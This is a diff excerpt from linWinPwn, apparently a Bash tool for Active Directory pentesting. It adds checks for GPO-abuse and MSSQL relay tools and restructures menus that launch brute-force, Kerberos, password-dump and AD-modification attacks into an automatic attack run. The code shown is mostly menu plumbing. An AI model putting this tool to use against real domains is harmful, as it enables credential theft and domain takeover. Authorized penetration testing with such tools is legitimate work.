         if [ ! -f "${netexec}" ] ; then echo -e "${RED}[-] netexec is not installed${NC}"; else echo -e "${GREEN}[+] netexec is installed${NC}"; fi
@@ -3718,23 +4011,25 @@ config_menu () {
         if [ ! -f "${orpheus}" ] ; then echo -e "${RED}[-] orpheus is not installed${NC}"; else echo -e "${GREEN}[+] orpheus is installed${NC}"; fi
         if [ ! -f "${adalanche}" ] ; then echo -e "${RED}[-] adalanche is not installed${NC}"; else echo -e "${GREEN}[+] adalanche is installed${NC}"; fi
         if [ ! -x "${adalanche}" ] ; then echo -e "${RED}[-] adalanche is not executable${NC}"; else echo -e "${GREEN}[+] adalanche is executable${NC}"; fi
-        config_menu
-        ;;
+        if [ ! -f "${mssqlrelay}" ] ; then echo -e "${RED}[-] mssqlrelay is not installed${NC}"; else echo -e "${GREEN}[+] mssqlrelay is installed${NC}"; fi
+        if [ ! -f "${pygpoabuse}" ] ; then echo -e "${RED}[-] pygpoabuse is not installed${NC}"; else echo -e "${GREEN}[+] pygpoabuse is installed${NC}"; fi
+        if [ ! -x "${pygpoabuse}" ] ; then echo -e "${RED}[-] pygpoabuse is not executable${NC}"; else echo -e "${GREEN}[+] pygpoabuse is executable${NC}"; fi
+        if [ ! -f "${GPOwned}" ] ; then echo -e "${RED}[-] GPOwned is not installed${NC}"; else echo -e "${GREEN}[+] GPOwned is installed${NC}"; fi
+        if [ ! -x "${GPOwned}" ] ; then echo -e "${RED}[-] GPOwned is not executable${NC}"; else echo -e "${GREEN}[+] GPOwned is executable${NC}"; fi
+        config_menu;;
 
         2)
         echo -e ""
         sudo timedatectl set-ntp 0
         sudo ntpdate ${dc_ip}
         echo -e "${GREEN}[+] NTP sync complete${NC}"
-        config_menu
-        ;;
+        config_menu;;
 
         3)
         echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
         echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
         echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
-        config_menu
-        ;;
+        config_menu;;
 
         4)
         echo -e ""
@@ -3744,8 +4039,7 @@ config_menu () {
         sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
         echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
         echo -e "${GREEN}[+] DNS update complete${NC}"
-        config_menu
-        ;;
+        config_menu;;
 
         5)
         echo -e ""
@@ -3760,28 +4054,24 @@ config_menu () {
         pass_wordlist="${wordlists_dir}/rockyou.txt"
         user_wordlist="${wordlists_dir}/xato-net-10-million-usernames.txt"
         echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
-        config_menu
-        ;;
+        config_menu;;
 
         6)
         echo -e "Please specify new users wordlist file:"
         read -p ">> " user_wordlist </dev/tty
         echo -e "${GREEN}[+] Users wordlist file updated${NC}"
-        config_menu
-        ;;
+        config_menu;;
 
         7)
         echo -e "Please specify new passwords wordlist file:"
         read -p ">> " pass_wordlist </dev/tty
         echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
-        config_menu
-        ;;
+        config_menu;;
 
         8)
         echo ""
         set_attackerIP
-        config_menu
-        ;;
+        config_menu;;
 
         9)
         echo ""
@@ -3793,23 +4083,19 @@ config_menu () {
             ldaps_bool=false
             echo -e "${GREEN}[+] Switched to using LDAP on port 389${NC}"
         fi
-        config_menu
-        ;;
+        config_menu;;
 
         10)
         echo ""
         print_info
-        config_menu
-        ;;
+        config_menu;;
 
         back)
-        init_menu
-        ;;
+        init_menu;;
 
         *)
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        config_menu
-        ;;
+        config_menu;;
     esac
 }
 
@@ -3819,12 +4105,14 @@ main_menu () {
     echo -e "-----------------------------------------------------"
     echo -e "1) Re-run DNS Enumeration using adidnsdump"
     echo -e "2) Active Directory Enumeration Menu"
-    echo -e "3) Kerberos Attacks Menu"
-    echo -e "4) SMB shares Enumeration Menu"
-    echo -e "5) Vulnerability Checks Menu"
-    echo -e "6) Password Dump Menu"
-    echo -e "7) Run MSSQL Enumeration"
-    echo -e "8) LDAP Console Menu"
+    echo -e "3) ADCS Enumeration Menu"
+    echo -e "4) Brute Force Attacks Menu"
+    echo -e "5) Kerberos Attacks Menu"
+    echo -e "6) SMB shares Enumeration Menu"
+    echo -e "7) Vulnerability Checks Menu"
+    echo -e "8) MSSQL Enumeration Menu"
+    echo -e "9) Password Dump Menu"
+    echo -e "10) AD Objects or Attributes Modification Menu"
     echo -e "back) Go back to Init Menu"
     echo -e "exit) Exit"
 
@@ -3835,52 +4123,45 @@ main_menu () {
         1)
         /bin/rm ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
         dns_enum
-        main_menu
-        ;;
+        main_menu;;
 
         2)
-        ad_menu
-        ;;
+        ad_menu;;
 
         3)
-        kerberos_menu
-        ;;
+        adcs_menu;;
 
         4)
-        shares_menu
-        ;;
+        bruteforce_menu;;
 
         5)
-        vulns_menu
-        ;;
+        kerberos_menu;;
 
         6)
-        pwd_menu
-        ;;
+        shares_menu;;
 
         7)
-        mssql_enum
-        main_menu
-        ;;
+        vulns_menu;;
 
         8)
-        console_menu
-        main_menu
-        ;;
+        mssql_menu;;
+
+        9)
+        pwd_menu;;
+
+        10)
+        modif_menu;;
 
         back)
-        init_menu
-        ;; 
+        init_menu;; 
 
         exit)
-        exit 1
-        ;;
+        exit 1;;
 
         *)
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
         echo -e ""
-        main_menu
-        ;;
+        main_menu;;
     esac
 }
 
@@ -3893,123 +4174,41 @@ main () {
     sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
     echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
     echo -e ""
-    if [[ "$modules" == *"interactive"* ]]; then
-        modules="interactive"
+    if [ "${interactive_bool}" == true ]; then
         init_menu
-    elif [[ "$modules" == "" ]]; then
-        echo -e "${RED}[-] No modules specified${NC}"
-        echo -e "Use -h for help"
-        exit 1
     else
         dns_enum
-        for i in $(echo $modules | sed "s/,/ /g"); do
-            case $i in
-                ad_enum)
-                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
-                echo -e "${GREEN}------------------------------------------------${NC}"
-                echo -e ""
-                ad_enum
-                echo -e ""
-                ;;
-
-                kerberos)
-                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
-                echo -e "${GREEN}------------------------------------------${NC}"
-                echo -e ""
-                kerberos
-                echo -e ""
-                ;;
-
-                scan_shares)
-                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
-                echo -e "${GREEN}---------------------------------------${NC}"
-                echo -e ""
-                scan_shares
-                ;;
-
-                pwd_dump)
-                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
-                echo -e "${GREEN}---------------------------------${NC}"
-                echo -e ""
-                pwd_dump
-                ;;
-
-                mssql_enum)
-                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
-                echo -e "${GREEN}-------------------------------------${NC}"
-                echo -e ""
-                mssql_enum
-                echo -e ""
-                ;;
-
-                vuln_checks)
-                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
-                echo -e "${GREEN}----------------------------------------${NC}"
-                echo -e ""
-                vuln_checks
-                echo -e ""
-                ;;
-
-                all)
-                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
-                echo -e "${GREEN}------------------------------------------------${NC}"
-                echo -e ""
-                ad_enum
-                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
-                echo -e "${GREEN}------------------------------------------${NC}"
-                echo -e ""
-                kerberos
-                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
-                echo -e "${GREEN}---------------------------------------${NC}"
-                echo -e ""
-                scan_shares
-                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
-                echo -e "${GREEN}----------------------------------------${NC}"
-                echo -e ""
-                vuln_checks
-                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
-                echo -e "${GREEN}-------------------------------------${NC}"
-                echo -e ""
-                mssql_enum
-                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
-                echo -e "${GREEN}---------------------------------${NC}"
-                echo -e ""
-                pwd_dump
-                ;;
-
-                user)
-                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
-                echo -e "${GREEN}------------------------------------------------${NC}"
-                echo -e ""
-                ad_enum
-                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
-                echo -e "${GREEN}------------------------------------------${NC}"
-                echo -e ""
-                kerberos
-                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
-                echo -e "${GREEN}---------------------------------------${NC}"
-                echo -e ""
-                scan_shares
-                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
-                echo -e "${GREEN}----------------------------------------${NC}"
-                echo -e ""
-                vuln_checks
-                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
-                echo -e "${GREEN}-------------------------------------${NC}"
-                echo -e ""
-                mssql_enum
-                ;;
-
-                *)
-                echo -e "${RED}[-] Unknown module $i... ${NC}"
-                echo -e ""
-                ;;
-            esac
-        done
-
+        echo -e "${GREEN}[+] Start: Active Directory Enumeration${NC}"
+        echo -e "${GREEN}------------------------------------------------${NC}"
         echo -e ""
-        echo -e "${GREEN}[+] All modules have completed. Output folder is: ${output_dir}${NC}"
-        echo -e "${GREEN}-------------------------------------------------${NC}"
+        ad_enum
+        echo -e "${GREEN}[+] Start: ADCS Enumeration${NC}"
+        echo -e "${GREEN}---------------------------------------${NC}"
+        echo -e ""
+        adcs_enum
+        echo -e "${GREEN}[+] Start: User and password Brute force Attacks${NC}"
+        echo -e "${GREEN}------------------------------------------------${NC}"
+        echo -e ""
+        bruteforce
+        echo -e "${GREEN}[+] Start: Kerberos-based Attacks${NC}"
+        echo -e "${GREEN}------------------------------------------${NC}"
+        echo -e ""
+        kerberos
+        echo -e "${GREEN}[+] Start: Network Shares Scan${NC}"
+        echo -e "${GREEN}---------------------------------------${NC}"
+        echo -e ""
+        scan_shares
+        echo -e "${GREEN}[+] Start: Vulnerability Checks${NC}"
+        echo -e "${GREEN}----------------------------------------${NC}"
+        echo -e ""
+        vuln_checks
+        echo -e "${GREEN}[+] Start: MSSQL Enumeration${NC}"
+        echo -e "${GREEN}-------------------------------------${NC}"
+        echo -e ""
+        mssql_enum
+        echo -e ""
+        echo -e "${GREEN}[+] Automatic enumeration has completed. Output folder is: ${output_dir}${NC}"
+        echo -e "${GREEN}-----------------------------------------------------------${NC}"
 
     fi
 }
